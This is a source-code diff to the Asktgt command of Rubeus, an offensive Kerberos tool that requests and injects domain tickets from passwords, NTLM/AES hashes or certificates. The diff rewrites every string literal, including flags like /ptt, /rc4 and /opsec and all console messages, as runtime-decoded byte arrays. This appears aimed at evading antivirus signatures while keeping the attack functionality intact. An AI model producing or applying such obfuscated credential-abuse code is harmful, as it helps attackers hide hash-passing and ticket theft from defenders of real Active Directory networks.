@@ -9,21 +9,22 @@ namespace Rubeus.Commands
 {
     public class Asktgt : ICommand
     {
-        public static string CommandName => "asktgt";
+        private static string S(byte[] b) => System.Text.Encoding.UTF8.GetString(b);
+        public static string CommandName => S(new byte[] { 97, 115, 107, 116, 103, 116 });
 
         public void Execute(Dictionary<string, string> arguments)
         {
-            Console.WriteLine("[*] Action: Ask TGT\r\n");
+            Console.WriteLine(S(new byte[] { 91, 42, 93, 32, 65, 99, 116, 105, 111, 110, 58, 32, 65, 115, 107, 32, 84, 71, 84, 13, 10 }));
 
-            string user = "";
-            string domain = "";
-            string password = "";
-            string hash = "";
-            string dc = "";
-            string outfile = "";
-            string certificate = "";
-            string servicekey = "";
-            string principalType = "principal";
+            string user = S(new byte[] {});
+            string domain = S(new byte[] {});
+            string password = S(new byte[] {});
+            string hash = S(new byte[] {});
+            string dc = S(new byte[] {});
+            string outfile = S(new byte[] {});
+            string certificate = S(new byte[] {});
+            string servicekey = S(new byte[] {});
+            string principalType = S(new byte[] { 112, 114, 105, 110, 99, 105, 112, 97, 108 });
             
             bool ptt = false;
             bool opsec = false;
@@ -37,11 +38,11 @@ namespace Rubeus.Commands
 
             string proxyUrl = null;
             string service = null;
-            bool nopreauth = arguments.ContainsKey("/nopreauth");
+            bool nopreauth = arguments.ContainsKey(S(new byte[] { 47, 110, 111, 112, 114, 101, 97, 117, 116, 104 }));
 
-            if (arguments.ContainsKey("/user"))
+            if (arguments.ContainsKey(S(new byte[] { 47, 117, 115, 101, 114 })))
             {
-                string[] parts = arguments["/user"].Split('\\');
+                string[] parts = arguments[S(new byte[] { 47, 117, 115, 101, 114 })].Split('\\');
                 if (parts.Length == 2)
                 {
                     domain = parts[0];
@@ -49,33 +50,33 @@ namespace Rubeus.Commands
                 }
                 else
                 {
-                    user = arguments["/user"];
+                    user = arguments[S(new byte[] { 47, 117, 115, 101, 114 })];
                 }
             }
-            if (arguments.ContainsKey("/domain"))
+            if (arguments.ContainsKey(S(new byte[] { 47, 100, 111, 109, 97, 105, 110 })))
             {
-                domain = arguments["/domain"];
+                domain = arguments[S(new byte[] { 47, 100, 111, 109, 97, 105, 110 })];
             }
-            if (arguments.ContainsKey("/dc"))
+            if (arguments.ContainsKey(S(new byte[] { 47, 100, 99 })))
             {
-                dc = arguments["/dc"];
+                dc = arguments[S(new byte[] { 47, 100, 99 })];
             }
-            if (arguments.ContainsKey("/outfile"))
+            if (arguments.ContainsKey(S(new byte[] { 47, 111, 117, 116, 102, 105, 108, 101 })))
             {
-                outfile = arguments["/outfile"];
+                outfile = arguments[S(new byte[] { 47, 111, 117, 116, 102, 105, 108, 101 })];
             }
 
             encType = Interop.KERB_ETYPE.rc4_hmac; //default is non /enctype is specified
-            if (arguments.ContainsKey("/enctype")) {
-                string encTypeString = arguments["/enctype"].ToUpper();
+            if (arguments.ContainsKey(S(new byte[] { 47, 101, 110, 99, 116, 121, 112, 101 }))) {
+                string encTypeString = arguments[S(new byte[] { 47, 101, 110, 99, 116, 121, 112, 101 })].ToUpper();
 
-                if (encTypeString.Equals("RC4") || encTypeString.Equals("NTLM")) {
+                if (encTypeString.Equals(S(new byte[] { 82, 67, 52 })) || encTypeString.Equals(S(new byte[] { 78, 84, 76, 77 }))) {
                     encType = Interop.KERB_ETYPE.rc4_hmac;
-                } else if (encTypeString.Equals("AES128")) {
+                } else if (encTypeString.Equals(S(new byte[] { 65, 69, 83, 49, 50, 56 }))) {
                     encType = Interop.KERB_ETYPE.aes128_cts_hmac_sha1;
-                } else if (encTypeString.Equals("AES256") || encTypeString.Equals("AES")) {
+                } else if (encTypeString.Equals(S(new byte[] { 65, 69, 83, 50, 53, 54 })) || encTypeString.Equals(S(new byte[] { 65, 69, 83 }))) {
                     encType = Interop.KERB_ETYPE.aes256_cts_hmac_sha1;
-                } else if (encTypeString.Equals("DES")) {
+                } else if (encTypeString.Equals(S(new byte[] { 68, 69, 83 }))) {
                     encType = Interop.KERB_ETYPE.des_cbc_md5;
                 }
             }
@@ -83,137 +84,137 @@ namespace Rubeus.Commands
             {
                 domain = System.DirectoryServices.ActiveDirectory.Domain.GetCurrentDomain().Name;
 
-                Console.WriteLine("[*] Got domain: {0}", domain);
+                Console.WriteLine(S(new byte[] { 91, 42, 93, 32, 71, 111, 116, 32, 100, 111, 109, 97, 105, 110, 58, 32 }) + domain);
             }
 
-            if (arguments.ContainsKey("/password"))
+            if (arguments.ContainsKey(S(new byte[] { 47, 112, 97, 115, 115, 119, 111, 114, 100 })))
             {
-                password = arguments["/password"];
+                password = arguments[S(new byte[] { 47, 112, 97, 115, 115, 119, 111, 114, 100 })];
 
-                string salt = String.Format("{0}{1}", domain.ToUpperInvariant(), user);
+                string salt = String.Format(S(new byte[] { 123, 48, 125, 123, 49, 125 }), domain.ToUpperInvariant(), user);
 
                 // special case for computer account salts
-                if (user.EndsWith("$"))
+                if (user.EndsWith(S(new byte[] { 36 })))
                 {
-                    salt = String.Format("{0}host{1}.{2}", domain.ToUpperInvariant(), user.TrimEnd('$').ToLowerInvariant(), domain.ToLowerInvariant());
+                    salt = String.Format(S(new byte[] { 123, 48, 125, 104, 111, 115, 116, 123, 49, 125, 46, 123, 50, 125 }), domain.ToUpperInvariant(), user.TrimEnd('$').ToLowerInvariant(), domain.ToLowerInvariant());
                 }
 
                 // special case for samaccountname spoofing to support Kerberos AES Encryption
-                if (arguments.ContainsKey("/oldsam"))
+                if (arguments.ContainsKey(S(new byte[] { 47, 111, 108, 100, 115, 97, 109 })))
                 {
-                    salt = String.Format("{0}host{1}.{2}", domain.ToUpperInvariant(), arguments["/oldsam"].TrimEnd('$').ToLowerInvariant(), domain.ToLowerInvariant());
+                    salt = String.Format(S(new byte[] { 123, 48, 125, 104, 111, 115, 116, 123, 49, 125, 46, 123, 50, 125 }), domain.ToUpperInvariant(), arguments[S(new byte[] { 47, 111, 108, 100, 115, 97, 109 })].TrimEnd('$').ToLowerInvariant(), domain.ToLowerInvariant());
 
                 }
 
                 if (encType != Interop.KERB_ETYPE.rc4_hmac)
-                    Console.WriteLine("[*] Using salt: {0}", salt);
+                    Console.WriteLine(S(new byte[] { 91, 42, 93, 32, 85, 115, 105, 110, 103, 32, 115, 97, 108, 116, 58, 32 }) + salt);
 
                 hash = Crypto.KerberosPasswordHash(encType, password, salt);
             }
 
-            else if (arguments.ContainsKey("/des"))
+            else if (arguments.ContainsKey(S(new byte[] { 47, 100, 101, 115 })))
             {
-                hash = arguments["/des"];
+                hash = arguments[S(new byte[] { 47, 100, 101, 115 })];
                 encType = Interop.KERB_ETYPE.des_cbc_md5;
             }
-            else if (arguments.ContainsKey("/rc4"))
+            else if (arguments.ContainsKey(S(new byte[] { 47, 114, 99, 52 })))
             {
-                hash = arguments["/rc4"];
+                hash = arguments[S(new byte[] { 47, 114, 99, 52 })];
                 encType = Interop.KERB_ETYPE.rc4_hmac;
             }
-            else if (arguments.ContainsKey("/ntlm"))
+            else if (arguments.ContainsKey(S(new byte[] { 47, 110, 116, 108, 109 })))
             {
-                hash = arguments["/ntlm"];
+                hash = arguments[S(new byte[] { 47, 110, 116, 108, 109 })];
                 encType = Interop.KERB_ETYPE.rc4_hmac;
             }
-            else if (arguments.ContainsKey("/aes128"))
+            else if (arguments.ContainsKey(S(new byte[] { 47, 97, 101, 115, 49, 50, 56 })))
             {
-                hash = arguments["/aes128"];
+                hash = arguments[S(new byte[] { 47, 97, 101, 115, 49, 50, 56 })];
                 encType = Interop.KERB_ETYPE.aes128_cts_hmac_sha1;
             }
-            else if (arguments.ContainsKey("/aes256"))
+            else if (arguments.ContainsKey(S(new byte[] { 47, 97, 101, 115, 50, 53, 54 })))
             {
-                hash = arguments["/aes256"];
+                hash = arguments[S(new byte[] { 47, 97, 101, 115, 50, 53, 54 })];
                 encType = Interop.KERB_ETYPE.aes256_cts_hmac_sha1;
             }
             
-            if (arguments.ContainsKey("/certificate")) {
-                certificate = arguments["/certificate"];
+            if (arguments.ContainsKey(S(new byte[] { 47, 99, 101, 114, 116, 105, 102, 105, 99, 97, 116, 101 }))) {
+                certificate = arguments[S(new byte[] { 47, 99, 101, 114, 116, 105, 102, 105, 99, 97, 116, 101 })];
 
-                if(arguments.ContainsKey("/verifychain") || arguments.ContainsKey("/verifycerts"))
+                if(arguments.ContainsKey(S(new byte[] { 47, 118, 101, 114, 105, 102, 121, 99, 104, 97, 105, 110 })) || arguments.ContainsKey(S(new byte[] { 47, 118, 101, 114, 105, 102, 121, 99, 101, 114, 116, 115 })))
                 {
-                    Console.WriteLine("[*] Verifying the entire certificate chain!\r\n");
+                    Console.WriteLine(S(new byte[] { 91, 42, 93, 32, 86, 101, 114, 105, 102, 121, 105, 110, 103, 32, 116, 104, 101, 32, 101, 110, 116, 105, 114, 101, 32, 99, 101, 114, 116, 105, 102, 105, 99, 97, 116, 101, 32, 99, 104, 97, 105, 110, 33, 13, 10 }));
                     verifyCerts = true;
                 }
-                if (arguments.ContainsKey("/getcredentials"))
+                if (arguments.ContainsKey(S(new byte[] { 47, 103, 101, 116, 99, 114, 101, 100, 101, 110, 116, 105, 97, 108, 115 })))
                 {
                     getCredentials = true;
                 }
             }
 
-            if (arguments.ContainsKey("/servicekey")) {
-                servicekey = arguments["/servicekey"];
+            if (arguments.ContainsKey(S(new byte[] { 47, 115, 101, 114, 118, 105, 99, 101, 107, 101, 121 }))) {
+                servicekey = arguments[S(new byte[] { 47, 115, 101, 114, 118, 105, 99, 101, 107, 101, 121 })];
             }
 
-            if (arguments.ContainsKey("/ptt"))
+            if (arguments.ContainsKey(S(new byte[] { 47, 112, 116, 116 })))
             {
                 ptt = true;
             }
 
-            if (arguments.ContainsKey("/opsec"))
+            if (arguments.ContainsKey(S(new byte[] { 47, 111, 112, 115, 101, 99 })))
             {
                 opsec = true;
-                if (arguments.ContainsKey("/force"))
+                if (arguments.ContainsKey(S(new byte[] { 47, 102, 111, 114, 99, 101 })))
                 {
                     force = true;
                 }
             }
 
-            if (arguments.ContainsKey("/nopac"))
+            if (arguments.ContainsKey(S(new byte[] { 47, 110, 111, 112, 97, 99 })))
             {
                 pac = false;
             }
 
 
-            if (arguments.ContainsKey("/proxyurl"))
+            if (arguments.ContainsKey(S(new byte[] { 47, 112, 114, 111, 120, 121, 117, 114, 108 })))
             {
-                proxyUrl = arguments["/proxyurl"];
+                proxyUrl = arguments[S(new byte[] { 47, 112, 114, 111, 120, 121, 117, 114, 108 })];
             }
-            if (arguments.ContainsKey("/service"))
+            if (arguments.ContainsKey(S(new byte[] { 47, 115, 101, 114, 118, 105, 99, 101 })))
             {
-                service = arguments["/service"];
+                service = arguments[S(new byte[] { 47, 115, 101, 114, 118, 105, 99, 101 })];
             }
 
-            if (arguments.ContainsKey("/luid"))
+            if (arguments.ContainsKey(S(new byte[] { 47, 108, 117, 105, 100 })))
             {
                 try
                 {
-                    luid = new LUID(arguments["/luid"]);
+                    luid = new LUID(arguments[S(new byte[] { 47, 108, 117, 105, 100 })]);
                 }
                 catch
                 {
-                    Console.WriteLine("[X] Invalid LUID format ({0})\r\n", arguments["/luid"]);
+                    Console.WriteLine(S(new byte[] { 91, 88, 93, 32, 73, 110, 118, 97, 108, 105, 100, 32, 76, 85, 73, 68, 32, 102, 111, 114, 109, 97, 116, 32, 40 }) + arguments[S(new byte[] { 47, 108, 117, 105, 100 })] + S(new byte[] { 41, 13, 10 }));
                     return;
                 }
             }
 
-            if (arguments.ContainsKey("/suppenctype"))
+            if (arguments.ContainsKey(S(new byte[] { 47, 115, 117, 112, 112, 101, 110, 99, 116, 121, 112, 101 })))
             {
-                string encTypeString = arguments["/suppenctype"].ToUpper();
+                string encTypeString = arguments[S(new byte[] { 47, 115, 117, 112, 112, 101, 110, 99, 116, 121, 112, 101 })].ToUpper();
 
-                if (encTypeString.Equals("RC4") || encTypeString.Equals("NTLM"))
+                if (encTypeString.Equals(S(new byte[] { 82, 67, 52 })) || encTypeString.Equals(S(new byte[] { 78, 84, 76, 77 })))
                 {
                     suppEncType = Interop.KERB_ETYPE.rc4_hmac;
                 }
-                else if (encTypeString.Equals("AES128"))
+                else if (encTypeString.Equals(S(new byte[] { 65, 69, 83, 49, 50, 56 })))
                 {
                     suppEncType = Interop.KERB_ETYPE.aes128_cts_hmac_sha1;
                 }
-                else if (encTypeString.Equals("AES256") || encTypeString.Equals("AES"))
+                else if (encTypeString.Equals(S(new byte[] { 65, 69, 83, 50, 53, 54 })) || encTypeString.Equals(S(new byte[] { 65, 69, 83 })))
                 {
                     suppEncType = Interop.KERB_ETYPE.aes256_cts_hmac_sha1;
                 }
-                else if (encTypeString.Equals("DES"))
+                else if (encTypeString.Equals(S(new byte[] { 68, 69, 83 })))
                 {
                     suppEncType = Interop.KERB_ETYPE.des_cbc_md5;
                 }
@@ -222,52 +223,52 @@ namespace Rubeus.Commands
             {
                 suppEncType = encType;
             }
-            if (arguments.ContainsKey("/principaltype")) {
-                principalType = arguments["/principaltype"]; 
+            if (arguments.ContainsKey(S(new byte[] { 47, 112, 114, 105, 110, 99, 105, 112, 97, 108, 116, 121, 112, 101 }))) {
+                principalType = arguments[S(new byte[] { 47, 112, 114, 105, 110, 99, 105, 112, 97, 108, 116, 121, 112, 101 })]; 
             }
 
-            if (arguments.ContainsKey("/createnetonly"))
+            if (arguments.ContainsKey(S(new byte[] { 47, 99, 114, 101, 97, 116, 101, 110, 101, 116, 111, 110, 108, 121 })))
             {
                 // if we're starting a hidden process to apply the ticket to
                 if (!Helpers.IsHighIntegrity())
                 {
-                    Console.WriteLine("[X] You need to be in high integrity to apply a ticket to created logon session");
+                    Console.WriteLine(S(new byte[] { 91, 88, 93, 32, 89, 111, 117, 32, 110, 101, 101, 100, 32, 116, 111, 32, 98, 101, 32, 105, 110, 32, 104, 105, 103, 104, 32, 105, 110, 116, 101, 103, 114, 105, 116, 121, 32, 116, 111, 32, 97, 112, 112, 108, 121, 32, 97, 32, 116, 105, 99, 107, 101, 116, 32, 116, 111, 32, 99, 114, 101, 97, 116, 101, 100, 32, 108, 111, 103, 111, 110, 32, 115, 101, 115, 115, 105, 111, 110 }));
                     return;
                 }
-                if (arguments.ContainsKey("/show"))
+                if (arguments.ContainsKey(S(new byte[] { 47, 115, 104, 111, 119 })))
                 {
-                    luid = Helpers.CreateProcessNetOnly(arguments["/createnetonly"], true);
+                    luid = Helpers.CreateProcessNetOnly(arguments[S(new byte[] { 47, 99, 114, 101, 97, 116, 101, 110, 101, 116, 111, 110, 108, 121 })], true);
                 }
                 else
                 {
-                    luid = Helpers.CreateProcessNetOnly(arguments["/createnetonly"], false);
+                    luid = Helpers.CreateProcessNetOnly(arguments[S(new byte[] { 47, 99, 114, 101, 97, 116, 101, 110, 101, 116, 111, 110, 108, 121 })], false);
                 }
                 Console.WriteLine();
             }
 
             if (String.IsNullOrEmpty(user))
             {
-                Console.WriteLine("\r\n[X] You must supply a user name!\r\n");
+                Console.WriteLine(S(new byte[] { 13, 10, 91, 88, 93, 32, 89, 111, 117, 32, 109, 117, 115, 116, 32, 115, 117, 112, 112, 108, 121, 32, 97, 32, 117, 115, 101, 114, 32, 110, 97, 109, 101, 33, 13, 10 }));
                 return;
             }
             if (String.IsNullOrEmpty(hash) && String.IsNullOrEmpty(certificate) && !nopreauth)
             {
-                Console.WriteLine("\r\n[X] You must supply a /password, /certificate or a [/des|/rc4|/aes128|/aes256] hash!\r\n");
+                Console.WriteLine(S(new byte[] { 13, 10, 91, 88, 93, 32, 89, 111, 117, 32, 109, 117, 115, 116, 32, 115, 117, 112, 112, 108, 121, 32, 97, 32, 47, 112, 97, 115, 115, 119, 111, 114, 100, 44, 32, 47, 99, 101, 114, 116, 105, 102, 105, 99, 97, 116, 101, 32, 111, 114, 32, 97, 32, 91, 47, 100, 101, 115, 124, 47, 114, 99, 52, 124, 47, 97, 101, 115, 49, 50, 56, 124, 47, 97, 101, 115, 50, 53, 54, 93, 32, 104, 97, 115, 104, 33, 13, 10 }));
                 return;
             }
 
-            bool changepw = arguments.ContainsKey("/changepw");
+            bool changepw = arguments.ContainsKey(S(new byte[] { 47, 99, 104, 97, 110, 103, 101, 112, 119 }));
 
             if (!((encType == Interop.KERB_ETYPE.des_cbc_md5) || (encType == Interop.KERB_ETYPE.rc4_hmac) || (encType == Interop.KERB_ETYPE.aes128_cts_hmac_sha1) || (encType == Interop.KERB_ETYPE.aes256_cts_hmac_sha1)))
             {
-                Console.WriteLine("\r\n[X] Only /des, /rc4, /aes128, and /aes256 are supported at this time.\r\n");
+                Console.WriteLine(S(new byte[] { 13, 10, 91, 88, 93, 32, 79, 110, 108, 121, 32, 47, 100, 101, 115, 44, 32, 47, 114, 99, 52, 44, 32, 47, 97, 101, 115, 49, 50, 56, 44, 32, 97, 110, 100, 32, 47, 97, 101, 115, 50, 53, 54, 32, 97, 114, 101, 32, 115, 117, 112, 112, 111, 114, 116, 101, 100, 32, 97, 116, 32, 116, 104, 105, 115, 32, 116, 105, 109, 101, 46, 13, 10 }));
                 return;
             }
             else
             {
                 if ((opsec) && (encType != Interop.KERB_ETYPE.aes256_cts_hmac_sha1) && !(force))
                 {
-                    Console.WriteLine("[X] Using /opsec but not using /enctype:aes256, to force this behaviour use /force");
+                    Console.WriteLine(S(new byte[] { 91, 88, 93, 32, 85, 115, 105, 110, 103, 32, 47, 111, 112, 115, 101, 99, 32, 98, 117, 116, 32, 110, 111, 116, 32, 117, 115, 105, 110, 103, 32, 47, 101, 110, 99, 116, 121, 112, 101, 58, 97, 101, 115, 50, 53, 54, 44, 32, 116, 111, 32, 102, 111, 114, 99, 101, 32, 116, 104, 105, 115, 32, 98, 101, 104, 97, 118, 105, 111, 117, 114, 32, 117, 115, 101, 32, 47, 102, 111, 114, 99, 101 }));
                     return;
                 }
                 if (nopreauth)
@@ -281,11 +282,11 @@ namespace Rubeus.Commands
                         KRB_ERROR error = ex.krbError;
                         try
                         {
-                            Console.WriteLine("\r\n[X] KRB-ERROR ({0}) : {1}: {2}\r\n", error.error_code, (Interop.KERBEROS_ERROR)error.error_code, error.e_text);
+                            Console.WriteLine(S(new byte[] { 13, 10, 91, 88, 93, 32, 75, 82, 66, 45, 69, 82, 82, 79, 82, 32, 40 }) + error.error_code + S(new byte[] { 41, 32, 58, 32 }) + (Interop.KERBEROS_ERROR)error.error_code + S(new byte[] { 58, 32 }) + error.e_text + S(new byte[] { 13, 10 }));
                         }
                         catch
                         {
-                            Console.WriteLine("\r\n[X] KRB-ERROR ({0}) : {1}\r\n", error.error_code, (Interop.KERBEROS_ERROR)error.error_code);
+                            Console.WriteLine(S(new byte[] { 13, 10, 91, 88, 93, 32, 75, 82, 66, 45, 69, 82, 82, 79, 82, 32, 40 }) + error.error_code + S(new byte[] { 41, 32, 58, 32 }) + (Interop.KERBEROS_ERROR)error.error_code + S(new byte[] { 13, 10 }));
                         }
                     }
                 }
